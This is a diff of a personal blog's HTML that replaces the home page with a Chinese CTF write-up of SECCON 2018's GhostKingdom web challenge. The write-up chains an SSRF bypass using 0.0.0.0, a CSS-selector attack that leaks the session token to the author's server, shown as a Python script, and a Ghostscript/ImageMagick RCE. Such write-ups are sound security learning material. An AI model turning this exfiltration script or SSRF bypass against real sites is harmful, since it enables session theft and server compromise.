@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="CTF,Web,CSS选择器,SSRF,GhostMagick,ImageMagick," />
 
 
 
@@ -79,16 +79,33 @@
 
 
 
-<meta name="description" content="质性自然，非矫历所得">
-<meta property="og:type" content="website">
-<meta property="og:title" content="donky16">
-<meta property="og:url" content="http://blog.donky.top/index.html">
+<meta name="description" content="时间过的很快，已经大三了，这周通宵参加了SECCON CTF2018，几经周折做出了Web的GhostKindom，还是有一些脑洞的，但也收获颇丰，稍微记录一下">
+<meta name="keywords" content="CTF,Web,CSS选择器,SSRF,GhostMagick,ImageMagick">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SECCON2018-Web-GhostKindom-WP">
+<meta property="og:url" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/index.html">
 <meta property="og:site_name" content="donky16">
-<meta property="og:description" content="质性自然，非矫历所得">
+<meta property="og:description" content="时间过的很快，已经大三了，这周通宵参加了SECCON CTF2018，几经周折做出了Web的GhostKindom，还是有一些脑洞的，但也收获颇丰，稍微记录一下">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/menu.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/message.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/css.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/preview.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/screenshot.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/127.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/up_menu.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/csrf.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/cookie.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/admin.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/convert.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/poc.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/result.png">
+<meta property="og:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/flag.png">
+<meta property="og:updated_time" content="2018-10-27T20:50:43.076Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="donky16">
-<meta name="twitter:description" content="质性自然，非矫历所得">
+<meta name="twitter:title" content="SECCON2018-Web-GhostKindom-WP">
+<meta name="twitter:description" content="时间过的很快，已经大三了，这周通宵参加了SECCON CTF2018，几经周折做出了Web的GhostKindom，还是有一些脑洞的，但也收获颇丰，稍微记录一下">
+<meta name="twitter:image" content="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/menu.png">
 
 
 
@@ -118,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="http://blog.donky.top/"/>
+  <link rel="canonical" href="http://blog.donky.top/2018/10/28/SECCON2018-Web-GhostKindom-WP/"/>
 
 
 
 
 
-  <title>donky16</title>
+  <title>SECCON2018-Web-GhostKindom-WP | donky16</title>
   
 
 
@@ -143,8 +160,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -247,9 +263,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -279,9 +295,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/28/SECCON2018-Web-GhostKindom-WP/" itemprop="url">SECCON2018-Web-GhostKindom-WP</a></h1>
+          <h1 class="post-title" itemprop="name headline">SECCON2018-Web-GhostKindom-WP</h1>
         
 
         <div class="post-meta">
@@ -364,16 +378,14 @@
       
 
       
-        
-          <p>时间过的很快，已经大三了，这周通宵参加了SECCON CTF2018，几经周折做出了Web的GhostKindom，还是有一些脑洞的，但也收获颇丰，稍微记录一下
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/10/28/SECCON2018-Web-GhostKindom-WP/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+        <p>时间过的很快，已经大三了，这周通宵参加了SECCON CTF2018，几经周折做出了Web的GhostKindom，还是有一些脑洞的，但也收获颇丰，稍微记录一下<a id="more"></a></p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>直接给了url<code>http://ghostkingdom.pwn.seccon.jp/FLAG/</code>提示flag在此目录下，题目设置在上层目录。</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>打开创建用户并登陆之后出现菜单栏<br><img src="menu.png" alt=""><br>upload image功能只能本地用户访问</p>
+<h3 id="留言功能"><a href="#留言功能" class="headerlink" title="留言功能"></a>留言功能</h3><p>给admin留言功能，可以自定义格式<br><img src="message.png" alt=""><br>分别选择两种，发现css通过get方法设置<br><img src="css.png" alt=""><br>将css用base64解码，获得<code>span{background-color:red;color:yellow}</code>，使用<code>Emergency</code>发现，msg被css渲染<br><img src="preview.png" alt=""><br>开始猜测会有xss，可是测试了很多发现<code>&lt;&gt;</code>都被html实体编码了，而且admin根本就不会打开这个页面，抓包发现，msg也没有发送到服务端，接着就很迷。。</p>
+<h3 id="截图功能"><a href="#截图功能" class="headerlink" title="截图功能"></a>截图功能</h3><p>截图界面，输入url可以获得url页面的截图<br><img src="screenshot.png" alt=""><br>这里肯定是一个SSRF，url=<code>http://127.0.0.1/</code>发现被禁止了<br><img src="127.png" alt=""><br>使用url=<code>http://0.0.0.0/?action=menu</code>，发现未登录，所以构造登陆链接，让服务端作为客户端生成session，登陆url=<code>http://0.0.0.0/?user=donkykk&amp;pass=qqqqqq&amp;action=login</code><br>接着再次访问menu，发现upload已经有权限了。<br><img src="up_menu.png" alt=""></p>
+<h3 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h3><p>我们虽然获得了upload的权限，但是那只是服务端作为客户端获得的，我们只能获得截图，根本都拿不到upload的链接，猜测一波或无果，想了很多办法读取<code>action=menu</code>的源码最后都以失败告终。<br>可是还有留言功能呢，利用CSS选择器获取页面源码也不错，但只能获得留言界面的源码，menu的并不行。看来一波留言界面的源码，发现有一个csrf<br><img src="csrf.png" alt=""><br>而且在留言时，csrf在get参数中，并且和cookie是一样的<br><img src="cookie.png" alt=""><br>我们虽然不知道upload的链接，也不是内网，但是可以通过css选择器，然后截图功能，按字符获取服务端作为客户端的cookie，如果只是在登陆的时候验证是否是内网，那么当我们获取cookie，就能获得upload的权限了。利用css选择器，截图url=<code>http://0.0.0.0/?css=input[value^=0]{background:url(http://donky.top/css0)}&amp;msg=test&amp;action=msgadm2</code>，当csrf的value=0*时，就会请求<a href="http://donky.top/css0，" target="_blank" rel="noopener">http://donky.top/css0，</a> 写脚本使用半自动的方式，获得一个字符后，就重新修改脚本中的cookie<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ghostkingdom.pwn.seccon.jp'</span></span><br><span class="line"><span class="comment">#http://0.0.0.0/?css=input[value^=0]&#123;background:url(http://donky.top/css0-0)&#125;&amp;msg=jj&amp;action=msgadm2</span></span><br><span class="line">headers = &#123;</span><br><span class="line">	<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'</span>,</span><br><span class="line">	<span class="string">'Cookie'</span>: <span class="string">'CGISESSID=36d510faf8ac4d863c7644'</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">	css = <span class="string">"input[value^=\"%s%s\"]&#123;background:url(\"http://donky.top/css0-%s.jpg\")&#125;"</span> % (cookie, str(hex(j))[<span class="number">2</span>:<span class="number">3</span>], str(j))</span><br><span class="line">	params = &#123;</span><br><span class="line">		<span class="string">'url'</span>:<span class="string">'http://0.0.0.0/?css=%s&amp;msg=test&amp;action=msgadm2'</span> % (base64.b64encode(css.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)).strip(<span class="string">'='</span>),</span><br><span class="line">		<span class="string">'action'</span>: <span class="string">'sshot2'</span></span><br><span class="line">	&#125;</span><br><span class="line">	print(css)</span><br><span class="line">	r = requests.get(url, headers=headers, params=params)</span><br><span class="line">	print(r.text)</span><br><span class="line">	time.sleep(<span class="number">30</span>)</span><br></pre></td></tr></table></figure></p>
+<p>最后终于获得了cookie<br><img src="admin.png" alt=""><br>浏览器修改cookie后，发现真的能够upload，感觉确实有一些脑洞啊，进入upload界面，随便上传一张图片，可以转成gif<br><img src="convert.png" alt=""><br>转化发现url=<code>http://ghostkingdom.pwn.seccon.jp/ghostMagick.cgi?action=convert</code>ghostMagick是ImameMagick的上层应用，有很多漏洞，找到了一篇文章<code>http://gv7.me/articles/2018/ghostscript-rce-20180821/</code><br><img src="poc.png" alt=""><br>我生成了两张poc图片。发现centos成功回显，将命令改为<code>ls ./FLAG</code>发现<br><img src="result.png" alt=""><br>最后获得flag<br><img src="flag.png" alt=""></p>
+
       
     </div>
     
@@ -388,328 +400,46 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://blog.donky.top/2018/06/02/SUCTF2018-Web-Multi_sql/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="admin">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="donky16">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/06/02/SUCTF2018-Web-Multi_sql/" itemprop="url">SUCTF-Web-Multi_sql</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-02T10:29:36+08:00">
-                2018-06-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
           
-
+            <a href="/tags/Web/" rel="tag"># Web</a>
           
-            
+            <a href="/tags/CSS选择器/" rel="tag"># CSS选择器</a>
           
-
+            <a href="/tags/SSRF/" rel="tag"># SSRF</a>
           
+            <a href="/tags/GhostMagick/" rel="tag"># GhostMagick</a>
           
-             <span id="/2018/06/02/SUCTF2018-Web-Multi_sql/" class="leancloud_visitors" data-flag-title="SUCTF-Web-Multi_sql">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
+            <a href="/tags/ImageMagick/" rel="tag"># ImageMagick</a>
           
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      
       
       
 
       
-        
-          <p>SUCTF是江苏高校联盟得战队，题目质量个人感觉很不错，学到了很多姿势。这里把Multi_sql这个题目补一下，结合了一些大佬的思路，加上自己的理解，复现了环境。所以有了这篇文章。文章中可能出现一些我搞不太懂的地方…23333
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/06/02/SUCTF2018-Web-Multi_sql/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/02/SUCTF2018-Web-Multi_sql/" rel="next" title="SUCTF-Web-Multi_sql">
+                <i class="fa fa-chevron-left"></i> SUCTF-Web-Multi_sql
+              </a>
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
 
-    
+          <span class="post-nav-divider"></span>
 
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://blog.donky.top/2018/04/30/StarCTF2018-PPC-Part/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="admin">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="donky16">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/30/StarCTF2018-PPC-Part/" itemprop="url">StarCTF-PPC-Part</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+          <div class="post-nav-prev post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-30T21:33:09+08:00">
-                2018-04-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/04/30/StarCTF2018-PPC-Part/" class="leancloud_visitors" data-flag-title="StarCTF-PPC-Part">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          <p>这次由六星战队负责出题的*ctf质量也是挺好的，虽然和BCTF时间上，有些冲突。但是由于太渣，早就放弃了BCTF，最后很遗憾Web一题也没做出来，只做了道PPC的题目magic_num，所以稍微写点吧
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/04/30/StarCTF2018-PPC-Part/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -719,10 +449,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -730,6 +461,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -750,8 +485,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -811,6 +555,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题思路"><span class="nav-number">2.</span> <span class="nav-text">解题思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#留言功能"><span class="nav-number">2.1.</span> <span class="nav-text">留言功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#截图功能"><span class="nav-number">2.2.</span> <span class="nav-text">截图功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#综合利用"><span class="nav-number">2.3.</span> <span class="nav-text">综合利用</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -943,6 +703,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
